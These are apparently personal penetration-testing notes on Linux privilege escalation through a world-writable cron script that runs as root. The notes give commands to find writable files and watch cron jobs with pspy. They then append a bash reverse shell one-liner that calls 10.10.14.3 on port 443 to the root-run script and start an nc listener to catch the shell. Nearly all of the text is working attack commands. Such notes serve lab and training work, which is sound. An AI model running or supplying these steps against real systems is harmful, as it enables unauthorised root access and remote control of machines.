**Search for writeable files or directories
```shell-session
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
- Example entry: 0 */12 * * * /home/admin/backup.sh (runs every 12 hours. minutes, hours, days, weeks, months)

**Check if script is world writeable and runs as root
```shell-session
ls -la /dmz-backups/
```

## pspy (find cronjobs)
```shell-session
./pspy64 -pf -i 1000
```

**Make a copy fo cronjob script
```shell-session
cp /dmz-backups/backup.sh backup2.sh
```

**Edit original file to create bash one-liner reverse shell (append)
```shell-session
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

**Create listener
```shell-session
nc -lvnp 443
```
